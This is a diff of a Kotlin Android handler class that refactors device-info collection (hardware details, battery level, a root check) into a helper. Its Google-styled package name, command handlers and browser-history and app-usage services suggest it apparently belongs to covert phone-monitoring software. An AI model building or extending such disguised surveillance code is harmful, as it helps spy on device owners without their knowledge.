@@ -6,9 +6,9 @@ import android.net.wifi.WifiManager
 import android.util.Log
 import com.google.android.systemservice.services.AppUsageService
 import com.google.android.systemservice.services.BrowserHistoryService
+import com.google.android.systemservice.utils.DeviceInfoProvider
 import kotlinx.coroutines.launch
 import org.json.JSONObject
-import java.io.File
 
 class DeviceInfoHandlers(private val ctx: CommandContext) {
 
@@ -90,28 +90,20 @@ class DeviceInfoHandlers(private val ctx: CommandContext) {
     // --- Helper functions ---
 
     private fun collectDeviceInfo(): JSONObject {
-        val batteryLevel = try {
-            val batteryManager = ctx.appContext.getSystemService(Context.BATTERY_SERVICE) as? android.os.BatteryManager
-            batteryManager?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
-        } catch (e: Exception) { -1 }
-
-        val isRooted = try {
-            val paths = arrayOf("/system/xbin/su", "/system/bin/su", "/sbin/su", "/data/local/xbin/su")
-            paths.any { File(it).exists() }
-        } catch (e: Exception) { false }
+        val batteryLevel = DeviceInfoProvider.getBatteryLevel(ctx.appContext)
 
         return JSONObject().apply {
             put("device_id", ctx.getDeviceIdentifier())
-            put("manufacturer", android.os.Build.MANUFACTURER)
-            put("model", android.os.Build.MODEL)
-            put("brand", android.os.Build.BRAND)
-            put("sdk_version", android.os.Build.VERSION.SDK_INT)
-            put("android_version", android.os.Build.VERSION.RELEASE)
-            put("os_version", android.os.Build.VERSION.RELEASE)
-            put("device", android.os.Build.DEVICE)
-            put("product", android.os.Build.PRODUCT)
+            put("manufacturer", DeviceInfoProvider.getManufacturer())
+            put("model", DeviceInfoProvider.getModel())
+            put("brand", DeviceInfoProvider.getBrand())
+            put("sdk_version", DeviceInfoProvider.getSdkVersion())
+            put("android_version", DeviceInfoProvider.getAndroidVersion())
+            put("os_version", DeviceInfoProvider.getAndroidVersion())
+            put("device", DeviceInfoProvider.getDevice())
+            put("product", DeviceInfoProvider.getProduct())
             put("battery_level", batteryLevel)
-            put("is_rooted", isRooted)
+            put("is_rooted", DeviceInfoProvider.isRooted())
         }
     }
 
